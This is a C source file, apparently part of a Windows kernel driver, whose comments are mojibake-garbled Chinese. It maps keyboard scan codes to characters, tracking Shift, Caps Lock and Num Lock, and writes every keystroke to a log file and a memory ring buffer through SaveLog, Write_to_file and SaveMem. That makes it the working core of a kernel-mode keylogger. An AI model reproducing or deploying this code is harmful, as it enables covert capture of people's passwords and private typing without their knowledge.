/*
*******************************************************************************
*= = �ļ����ƣ�MyKeyCodeTransform.h
*= = �ļ�����������MyKeyCodeTransform��ͷ�ļ�
*= = ��    �ߣ���Ĭ��С��
*= = ��дʱ�䣺2016-07-09 19:18:00
*******************************************************************************
*/

#include <keycode.h>

//*============================================================================ 
//*= = ȫ�ֱ��� 
//*============================================================================

extern PVOID RecordMemory;

static int kb_status = NULL;

//ɨ����1-83�ͼ�ֵ�Ķ�Ӧ����k[1]����ɨ����Ϊ\x01
int k[100] = { 10000, 27, 49, 50, 51, 52, 53, 54, 55, 56,
				  57, 48,189,187,  8,  9, 81, 87, 69, 82,
				  84, 89, 85, 73, 79, 80,219,221, 13, 17,
				  65, 83, 68, 70, 71, 72, 74, 75, 76,186,
				 222,192, 16,220, 90, 88, 67, 86, 66, 78,
				  77,188,190,191, 16,106, 18, 32, 20,112,
				 113,114,115,116,117,118,119,120,121,144,
				 145,103,104,105,109,100,101,102,107, 97,
				  98, 99, 96,110};

//*============================================================================
//*= = �������ƣ�CODE_S2K
//*= = ����������ת��Ϊ�ɼ��ַ�
//*= = ��ڲ�����UCHAR
//*= = ���ڲ�����VOID
//*============================================================================
void CODE_S2K(UCHAR sch)
{//������106����С���̵ġ�*���ļ�ֵ,145����scroll lock��,
	int kcode;
	int i;
	BOOLEAN bShift, bCapital, bNumLock;
	int punc;
	UCHAR c[1] = {0};
	char s[3] = "";

	i = (int)sch;
	kcode = k[i];
	if (kcode < 128)  
		c[0] = (UCHAR)kcode;   //c[0]�����ֵС��128��punc��ֵ����128
	else
		punc = kcode;

	if ((sch & 0x80) == 0)	//����
		{
			if ((sch < 0x54)) //����С�����Ƿ�򿪶���¼
				//|| ((sch >= 0x47 && sch < 0x54) && (kb_status & S_NUM))) // С���̱��򿪵����
			{
				 bShift   = (kb_status & 1) == 1;
				 bCapital = (kb_status & 2) == 2;
				 bNumLock = (kb_status & 4) == 4;
				 if (c[0] >= 48 && c[0] <= 57)	// ����0-9
					if (!bShift){
						SaveLog(c, 1);
						return;
					}

				 if (c[0] >= 65 && c[0] <= 90)   // A-Z    a-z
				 {
					 if (!bCapital)
						 if (bShift)
							 c[0] = c[0];
						 else
							 c[0] = c[0] + 32;
					 else
						 if (bShift)
							 c[0] = c[0] + 32;
						 else
							 c[0] = c[0];
					 SaveLog(c, 1);
					 return;
				 }
				 else if (c[0] >= 96 && c[0] <= 105)         // С����0-9
					 if (bNumLock){
						 c[0] = c[0] - 96 + 48;
						 SaveLog(c, 1);
						 return;
					 }
					 else{
						 char str[8] = { 0 };
						 switch (c[0]){
							 case 96 :strcpy(str, "[INS]"); break;
							 case 97 :strcpy(str, "[END]"); break;
							 case 98 :strcpy(str, "[DF]"); break;
							 case 99 :strcpy(str, "[PD]"); break;
							 case 100:strcpy(str, "[LF]"); break;
							 case 101:strcpy(str, "[5]"); break;
							 case 102:strcpy(str, "[RF]"); break;
							 case 103:strcpy(str, "[HOME]"); break;
							 case 104:strcpy(str, "[UF]"); break;
							 case 105:strcpy(str, "[PU]"); break;
							 default:c[0] = 'n'; break;
						 }
						 SaveLog(str, strlen(str));
						 return;
					 }
				 else if (c[0] >= 106 && c[0] <= 111){     //С����������
					 char s[6] = "";
					 switch (c[0])
					 {
						 case 106:
							 s[0] = '*'; break;
						 case 107:
							 s[0] = '+'; break;
						 case 109:
							 s[0] = '-'; break;
						 case 110:
							 if (bNumLock)
								 s[0] = '.'; 
							 else
								 strcpy(s, "[DEL]");
							 break;
						 case 111:
							 s[0] = '/'; break;
						 default:
							 s[0] = 'n'; break;
					 }
					 if (s[0] != 'n'){
						 if (s[0] == '[')
							 SaveLog(s, 5);
						 else
							 SaveLog(s, 1);
						 return;
					 }
				 }
				 else if (c[0] >= 112 && c[0] <= 123)    //F1~F12
				 {
					 //char s[3] = "";
					 memset(s,0,3);
					 switch (c[0])
					 {
					 case 112:
						 strcpy(s, "F1 ");  break;  //s[0] = (UCHAR)'F1'
					 case 113:
						 strcpy(s, "F2 ");  break;
					 case 114:
						 strcpy(s, "F3 "); break;
					 case 115:
						 strcpy(s, "F4 "); break;
					 case 116:
						 strcpy(s, "F5 "); break;
					 case 117:
						 strcpy(s, "F6 "); break;
					 case 118:
						 strcpy(s, "F7 "); break;
					 case 119:
						 strcpy(s, "F8 "); break;
					 case 120:
						 strcpy(s, "F9 "); break;
					 case 121:
						 strcpy(s, "F10"); break;
					 case 122:
						 strcpy(s, "F11"); break;
					 case 123:
						 strcpy(s, "F12"); break;
					 default:
						 s[0] = 'n'; break;
					 }
					 if (s[0] != 'n') {
						 SaveLog(s, 3);
						 return;
					 }
				 }

				 if (punc >= 186 && punc <= 222)
				 { // ������
					 //char s[3] = "";
					 memset(s, 0, 3);
					 switch (punc)
					 {
					 case 186:
						 if (!bShift) s[0] = ';'; else s[0] = ':'; break;
					 case 187:
						 if (!bShift)  s[0] = '='; else s[0] = '+'; break;
					 case 188:
						 if (!bShift) s[0] = ','; else s[0] = '<'; break;
					 case 189:
						 if (!bShift) s[0] = '-'; else s[0] = '_'; break;
					 case 190:
						 if (!bShift) {
							 s[0] = '.'; //SaveLog(flag, strlen(flag));
						 }
						 else s[0] = '>'; break;
					 case 191:
						 if (!bShift) s[0] = '/'; else s[0] = '?'; break;
					 case 192:
						 if (!bShift) s[0] = '`'; else s[0] = '~'; break;
					 case 219:
						 if (!bShift) s[0] = '['; else s[0] = '{'; break;
					 case 220:
						 if (!bShift) s[0] = '\\'; else s[0] = '|'; break;
					 case 221:
						 if (!bShift) s[0] = ']'; else s[0] = '}'; break;
					 case 222:
						 if (!bShift) s[0] = '\''; else s[0] = '\"'; break;
					 default:
						 s[0] = 'n'; break;
					 }
					 if (s[0] != 'n'){
						 SaveLog(s, 1);
						 return;
					 }
				 }

				 if (c[0] >= 8 && c[0] <= 46)   //������س���
				 {
					 char str[8];
					 switch (c[0])
					 {
					 case 8:strcpy(str, "[BK]"); break;
					 case 9:strcpy(str, "[TAB]"); break;
					 case 13:strcpy(str, "[EN]"); break;
					 case 17:strcpy(str, "[CTRL]"); break;
					 case 18:strcpy(str, "[ALT]"); break;
					 case 27:strcpy(str, "[ESC]"); break;
					 case 32:strcpy(str, "[SP]"); break;
					 case 33:strcpy(str, "[PU]"); break;
					 case 34:strcpy(str, "[PD]"); break;
					 case 35:strcpy(str, "[END]"); break;
					 case 36:strcpy(str, "[HOME]"); break;
					 case 37:strcpy(str, "[LF]"); break;
					 case 38:strcpy(str, "[UF]"); break;
					 case 39:strcpy(str, "[RF]"); break;
					 case 40:strcpy(str, "[DF]"); break;
					 case 45:strcpy(str, "[INS]"); break;
					 case 46:strcpy(str, "[DEL]"); break;
					 default:c[0] = 'n'; break;
					 }
					 if (c[0] != 'n'){
						 SaveLog(str, strlen(str));
						 return;
					 }
				 }

			}//end if ((sch < 0x54)) //����С�����Ƿ�򿪶���¼
			char str[16];
			switch (sch){
				case 0x3A:
					kb_status ^= S_CAPS;
					strcpy(str, "[CAPSLOCK]");
					SaveLog(str, strlen(str));
					break;

				case 0x2A:
				case 0x36:
					kb_status |= S_SHIFT;
					strcpy(str, "[SHIFT]");
					SaveLog(str, strlen(str));
					break;

				case 0x45:
					kb_status ^= S_NUM;
					strcpy(str, "[NUMLOCK]");
					SaveLog(str, strlen(str));
			}
		}
		else		//break
		{
			if (sch == 0xAA || sch == 0xB6)
				kb_status &= ~S_SHIFT;
		}

	/*	if (ch >= 0x20 && ch < 0x7F)
		{
			DbgPrint("%C \n", ch);
		}*/
		//return ;
}

//*============================================================================
//*= = �������ƣ�SaveLog
//*= = ����������д���ļ�
//*= = ��ڲ�����CHAR*,INT
//*= = ���ڲ�����VOID
//*============================================================================

void SaveLog(char* c, int n)
{
	CHAR pszDest[30];
	ULONG cbDest = 30;
	LPCSTR pszFormat = "%s %c \r\n";
	CHAR* pszTxt = "[Input]:";

	INT i = 0;
	CHAR Buff[16];

	//Buff = (CHAR*)RecordMemory;

	//��ʽ�����Ӱ������ ������ʹ��
	//RtlStringCbPrintfA(pszDest, cbDest, pszFormat, pszTxt, *c);
	
	KdPrint(("[*]Record input\n"));
	
	//RtlStringCchCopyA(RecordMemory, strlen(pszDest), pszDest);

	//RtlStringCchCopyA(RecordMemory, n, *c);

	if (1 == n){
		Buff[0] = *c;
		Buff[1] = 0x00;
	}
	else{
		for (i = 0; i < n; i++)
			Buff[i] = c[i];
		Buff[n] = 0x00;
	}

	Write_to_file(0, Buff);
}

//*============================================================================
//*= = �������ƣ�SaveLog
//*= = ����������д���ڴ�
//*= = ��ڲ�����CHAR*,INT
//*= = ���ڲ�����VOID
//*============================================================================

void SaveMem(UCHAR CurCh)
{
	UCHAR* Buff;
	static INT Pos = 0;

	Buff = (PUCHAR)RecordMemory;//��ȡ�ڴ��ַ

	KdPrint(("[*]Write to memory\n"));

	//д���ڴ�
	Buff[Pos] = CurCh;
	Pos = (IRECORD_SIZE - 1 == Pos) ? 0 : Pos + 1;
	Buff[Pos] = 0x00;	

	//KeSetEvent(&event, 0, TRUE);//�¼��ܻ�ȡ���ź�״̬
}

//*============================================================================
//*= = �ļ�����
//*============================================================================